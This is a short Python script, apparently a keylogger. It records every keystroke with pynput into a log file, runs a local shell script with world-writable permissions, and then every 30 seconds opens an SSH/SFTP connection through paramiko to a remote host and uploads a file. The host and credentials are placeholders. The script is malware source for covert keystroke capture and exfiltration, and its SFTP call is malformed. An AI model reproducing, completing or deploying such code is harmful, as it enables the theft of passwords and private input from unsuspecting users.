import paramiko
import os
import  time
from pynput.keyboard import Key,Listener

count=0
keys=[]

def on_press(key):
    global keys,count

    keys.append(key)
    count += 1
    print("".format(key))

    if count >= 10:
        count=0
        write_file(keys)
        keys=[]


def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'" ,"")
          #  if k.find(b"space")>0:
           #     f.write('\n')
            #elif k.find("Key")== -1:
            f.write(k)

def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listenner:
    listenner.join()

os.system("chmod 777 bash.sh")
os.system("./bash.sh") #gerekli dosyaları yükledfgf


starttime = time.time()
while True:


    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect('ip adress', username='<User Name>', password='', key_filename='<.PEM File path')

    # Setup sftp connection and transmit this script
    print("copying")

    sftp = client.open_sftp()
    sftp.put( "< Source >," " < Destination >")


    sftp.close()
    time.sleep(30.0 - ((time.time() - starttime) % 30.0))
